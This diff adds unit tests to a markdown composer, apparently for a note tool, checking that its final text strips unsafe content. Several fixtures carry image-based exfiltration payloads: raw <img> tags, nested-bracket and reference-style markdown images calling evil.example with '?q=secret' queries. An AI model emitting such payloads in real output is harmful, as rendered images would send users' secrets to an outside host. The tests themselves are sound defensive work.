@@ -1175,3 +1175,57 @@ test('the topic\'s resolved model: a topic that follows its parent uses the mode
   assert.equal(await run('manual', 'claude:sonnet'), 'claude:haiku');
   assert.equal(await run('inherited', undefined), 'claude:haiku');
 });
+
+// ---------- R1 F1: the final text is built once more at the last step ----------
+test('R1-B1 composePhase2Detail: a correction with raw <img> or a markdown image writes neither', () => {
+  const out = composePhase2Detail(
+    verifyResult({
+      detail: '## 概念\n\n外套很保暖。',
+      footnotes: [],
+      verdicts: [{ sentence: '外套很保暖。', verdict: 'unsupported', correction: '<img src="https://evil.example/p.png?q=secret"> ![x](https://evil.example/i.png)' }]
+    }),
+    []
+  ).detail;
+  assert.doesNotMatch(out, /evil\.example|<img|!\[/);
+});
+
+test('R1-B1 composePhase2Detail: footnote titles with <img>, nested links or images write plain titles only', () => {
+  const out = composePhase2Detail(
+    verifyResult({
+      detail: '## 概念\n\n句子[^1][^2]。',
+      footnotes: [
+        { id: '1', url: 'https://ok.example/', title: '[<img src="https://evil.example/p.png?q=secret">](https://ok.example/)' },
+        { id: '2', url: 'https://ok.example/b', title: '![x](https://evil.example/i.png)' }
+      ]
+    }),
+    []
+  ).detail;
+  assert.doesNotMatch(out, /evil\.example|<img|!\[/);
+  assert.match(out, /\[\^1\]: \[/);
+  assert.match(out, /\[\^2\]: \[/);
+});
+
+test('R1-B1 composePhase2Detail: bypass forms in the body (nested brackets, reference image) write no image node; saved embeds stay', () => {
+  const out = composePhase2Detail(
+    verifyResult({ detail: '## 概念\n\n![a [b] c](https://evil.example/x.png?q=secret)\n\n![x]\n\n[x]: https://evil.example/i.png\n\n內容[^7]。' }),
+    [{ path: 'Att/a.png', image: IMAGE(1) }]
+  ).detail;
+  assert.doesNotMatch(out, /(^|[^\\])!\[(?!\[Att\/a\.png\]\])/m);
+  assert.doesNotMatch(out, /evil\.example\/x\.png/);
+  assert.match(out, /!\[\[Att\/a\.png\]\]/);
+  assert.match(out, /內容\\\[\^7\\\]/, 'a reference to a footnote that does not exist is plain text');
+});
+
+test('R1-M1 composePhase2Detail: a Wikimedia source address with parentheses is written as %28 %29', () => {
+  const out = composePhase2Detail(
+    verifyResult({ detail: '## 概念\n\n句子[^1]。', footnotes: [{ id: '1', url: 'https://commons.wikimedia.org/wiki/File:Coat_(2017).jpg', title: 'File' }] }),
+    []
+  ).detail;
+  assert.match(out, /\[\^1\]: \[File\]\(https:\/\/commons\.wikimedia\.org\/wiki\/File:Coat_%282017%29\.jpg\)/);
+});
+
+test('R1-B1 composePhase2Detail: reference definitions are not written, so they cannot wait for an image reference in the user text', () => {
+  const out = composePhase2Detail(verifyResult({ detail: '## 概念\n\n![x]\n\n[x]: https://evil.example/i.png\n\n句子。' }), []).detail;
+  assert.doesNotMatch(out, /evil\.example|^\[x\]:/m);
+  assert.match(out, /句子。/);
+});
